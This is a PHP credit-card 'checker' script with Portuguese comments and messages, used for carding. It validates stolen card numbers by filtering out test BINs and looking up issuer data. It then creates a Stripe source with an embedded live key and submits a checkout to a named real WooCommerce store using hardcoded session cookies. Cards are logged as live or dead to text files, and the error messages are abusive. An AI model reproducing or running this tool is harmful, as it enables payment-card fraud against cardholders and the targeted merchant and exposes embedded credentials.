<?php

//Coded By Limo


$time = time();


    error_reporting(0);

    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }

    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }



 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O    /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============


$metralhalindo = strlen($lista);

if (($metralhalindo < 7 ) or ($metralhalindo > 30 )) {

    die("#Error => Vai se foder randola kkkk...!");

}


$bloqueador_bin = substr($lista, 0, 4);


if (($bloqueador_bin == 6504 ) or ($bloqueador_bin == 6505 ) or ($bloqueador_bin == 6506 ) or ($bloqueador_bin == 6516 ) or ($bloqueador_bin ==  6011 ) or ($bloqueador_bin == 3747 ) or ($bloqueador_bin == 4960 )) {

die("#Error => Vai tacar gerada no cu da sua mae ....! ");


}

$ant_noia = substr($lista, 0, 8);


if (($ant_noia == 'Aprovada') or ($ant_noia == 'Aprovado')!== false) {

die(json_encode(array("Error" => "Aqui nao noiado do carai...!")));


}

if (($cvv == 000 )!== false){

    die("Error => Tacando 000 né? Por sua conta infelizmente nao foi seu dia kkk..");

}


$verificar_ano = strlen($ano);


if (($verificar_ano < 4 ) or ($verificar_ano > 4 )){

    die("Ano de validade, invalida..! O correto é 4 números");

}


$verificar_mes = strlen($mes);


if (($verificar_mes > 2 ) or ($verificar_mes < 2 )) {

    die("Informacoes invalidas, inseridas no mês do cartao de crédito a ser verificado..!");


}


$verificar_cvv = strlen($cvv);


if (($verificar_cvv > 4 ) or ($verificar_cvv < 2 )) {

    die("Informacoes invalidas, inseridas no campo do CVV do cartao de crédito..!");


}

 $anti_reteste_dies = file_get_contents("./ant-reteste-dies.txt", "r");
 $anti_reteste_lives = file_get_contents("./ant-reteste-lives.txt", "r");


if (strpos($anti_reteste_dies, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}

if (strpos($anti_reteste_lives, $lista)!== false) {

    die("#Error => Reteste aqui nao caraio...!");

}


 /// ===============  /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============
 /// =============== /// =========== /// ==========  S  I  S  T  E  M  A    D  E    P  R  O  T  E  C  A  O  -  M  E  T  R  A  I  A   /// ==================== /// ===================
 /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// =============== /// ===============



 


// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//

$verificar_bin = substr($lista, 0, 6);


$link = 'https://lookup.binlist.net/'.$verificar_bin.'';

$headers = array (

'accept: */*',
'origin: https://binlist.net',
'referer: https://binlist.net/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'


);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $headers);
$automatizacao_binssearch = curl_exec($ini);



$scheme = strtoupper(json_decode($automatizacao_binssearch, true)['scheme']);
$band = strtoupper(json_decode($automatizacao_binssearch, true)['brand']);
$bank = strtoupper(json_decode($automatizacao_binssearch, true)['bank']['name']);
$type = strtoupper(json_decode($automatizacao_binssearch, true)['type']);
$states = strtoupper(json_decode($automatizacao_binssearch, true)['country']['name']);

$prepaid = metraiapuxar($automatizacao_binssearch, '"prepaid":',',', 1);


if ($prepaid == 'false'){

    $Verificar_prepaid = "NÃO";

} else if ($prepaid == null) {

    $Verificar_prepaid = "N/A";

} else if ($prepaid == 'null'){

    $Verificar_prepaid = "N/A";

} else {

    $Verificar_prepaid = "SIM";

}

// ================ // ====================//======== BIN SEARCH - A U T O M A T I O N ( P H P ) ======================= // ================================//
// ================ // ====================//==========================//============================= // ================================//=================//



// ================ // ====================//==========================//============================= // ================================//=================//

## DADOS INFO - 4DEVS (API DADOS CHK)

$linkurl_dados = "https://www.4devs.com.br/ferramentas_online.php";
$post_dados = 'acao=gerar_pessoa&sexo=I&pontuacao=N&idade=0&cep_estado=&txt_qtde=1&cep_cidade=';
$agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.54";


$header_4devs = array (

'content-type: application/x-www-form-urlencoded',
'origin: https://www.4devs.com.br',
'referer: https://www.4devs.com.br/gerador_de_pessoas',
'user-agent: '.$agent.''

);


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $linkurl_dados);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_4devs);
curl_setopt($ini, CURLOPT_POSTFIELDS, $post_dados);
$dados = curl_exec($ini);


$nome = metraiapuxar($dados, '"nome":"','"');
$cpf = metraiapuxar($dados, '"cpf":"','"');
$rg = metraiapuxar($dados, '"rg":"','"');
$data_nasc = metraiapuxar($dados, '"data_nasc":"','"');
$sexo = metraiapuxar($dados, '"sexo":"','"');
$mae = metraiapuxar($dados, '"mae":"','"');
$pai = metraiapuxar($dados, '"pai":"','"');
$cep = metraiapuxar($dados, '"cep":"','"');
$endereco = metraiapuxar($dados, '"endereco":"','"');
$bairro = metraiapuxar($dados, '"bairro":"','"');
$celular = metraiapuxar($dados, '"celular":"','"');
$cidade = metraiapuxar($dados, '"cidade":"','"');
$telefone_fixo = metraiapuxar($dados, '"telefone_fixo":"','"');


## DADOS INFO - 4DEVS (API DADOS CHK)


// ================ // ====================//==========================//============================= // ================================//=================//

$header_stripesrc = array (

'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0'
);


$link_stripesrc = "https://api.stripe.com/v1/sources";

$postfields_stripesrc = 'type=card&owner[name]=Elon+Musk&owner[email]=limomine%40outlook.com&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=df193bba-9b74-4b7d-b347-134fc4573604347c80&muid=0a21b4dc-1a72-44ad-8665-f32d133b406083c960&sid=e2dc75fa-0e80-47ae-9468-455d9298e1a7c70afd&pasted_fields=number&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604&time_on_page=349153&key=pk_live_51LAcJGEeu0nzrC5fpVojBwYG2iaUwatMlPNFTltr0GctqhG6mz0HTjAFXMwqU98hU5Ikc4SWqLl6kBNThjf75tNy001srqER5N';

$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_stripesrc);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_stripesrc);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_stripesrc);
$meupiru = curl_exec($ini);
$id_do_carai = metraiapuxar($meupiru, 'id": "', '"', 1);


$nonce_carai = metraiapuxar($meupiru, 'id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"', 1); // FIS POR FAZER CASO PRECISA PUCHAR NO POSTFIELDS.


$header_pagar = array (

'accept: application/json, text/javascript, */*; q=0.01',
'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: PHPSESSID=di5cb8pafsemh894trp5biogrr; wcf_active_checkout=104; cartflows_session_102=102_b4abb55b1b84242439495482549a6e3b; wcf-visited-flow-102=%5B104%5D; __stripe_mid=0a21b4dc-1a72-44ad-8665-f32d133b406083c960; __stripe_sid=e2dc75fa-0e80-47ae-9468-455d9298e1a7c70afd; _fbp=fb.2.1669764625030.2058618528; IDRGPD=created; wordpress_logged_in_6d5060e982a04539e27cbe006cc299fe=Limosexocx2%7C1670974292%7CuwAUgIbcF4lpd3egityzsjHH4fICB0Fm3iMsZwRvvm4%7Cc3c7d7da30c8d25822ca91142b5dfda540c043580e486828c6f13764d98339ee; wp_woocommerce_session_6d5060e982a04539e27cbe006cc299fe=16%7C%7C1669937397%7C%7C1669933797%7C%7Cdcc4c204a92ed71570d8f3312cdf5cf5; woocommerce_items_in_cart=1; woocommerce_cart_hash=7c86d49e0abeb2cd9377b6e5eae58348; wcf-step-visited-102=%7B%22104%22%3A%7B%22control_step_id%22%3A104%2C%22current_step_id%22%3A104%2C%22step_type%22%3A%22checkout%22%2C%22visit_id%22%3A2201%2C%22conversion%22%3A%22no%22%7D%7D',
'origin: https://www.vlelitetraining.com.br',
'referer: https://www.vlelitetraining.com.br/step/finalizacao-de-compra-woo/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
'x-requested-with: XMLHttpRequest'


);

$link_pagar = "https://www.vlelitetraining.com.br/?wc-ajax=checkout&wcf_checkout_id=104&elementor_page_id=104";

$postfields_pagar = 'billing_email=limomine%40outlook.com&billing_first_name=Elon&billing_last_name=Musk&_wcf_flow_id=102&_wcf_checkout_id=104&payment_method=stripe&wc-stripe-payment-token=new&woocommerce-process-checkout-nonce=0f41ef6d6c&_wp_http_referer=%2Fstep%2Ffinalizacao-de-compra-woo%2F%3Fwc-ajax%3Dupdate_order_review%26wcf_checkout_id%3D104%26elementor_page_id%3D104&stripe_source='.$id_do_carai.'';


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $link_pagar);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_HTTPHEADER, $header_pagar);
curl_setopt($ini, CURLOPT_POSTFIELDS, $postfields_pagar);
echo $pagar = curl_exec($ini);
if(strpos($pagar, '"result":"failure"')!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $band - $scheme <span class='badge badge-primary'>BANCO</span> $bank <span class='badge badge-primary'>PAIS</span> $states <span class='badge badge-primary'>TIPO</span> $type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> Seu Cartão Foi Recusado.  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> $Verificacao_live <br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

} else if (empty($pagar)) {

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $band - $scheme <span class='badge badge-primary'>BANCO</span> $bank <span class='badge badge-primary'>PAIS</span> $states <span class='badge badge-primary'>TIPO</span> $type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-'>Retorno:</span> Seu Cartão Foi Recusado.  » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <span class='badge badge-warning'>Result Gateway</span> Error de Proxy..!  ($Verificacao_live)<br>";

      $file = fopen("ant-reteste-dies.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");

}

else {

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv » <span class='badge badge-primary'>BANDEIRA</span> $band - $scheme <span class='badge badge-primary'>BANCO</span> $bank <span class='badge badge-primary'>PAIS</span> $states <span class='badge badge-primary'>TIPO</span> $type <span class='badge badge-primary'>PREPAID</span> $Verificar_prepaid » <span class='badge badge-warning'>RETORNO</span> Seu Cartão Foi Aprovado. <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

      $file = fopen("ant-reteste-lives.txt", "a");
      fwrite($file, "$cc|$mes|$ano|$cvv\n");



}

?>
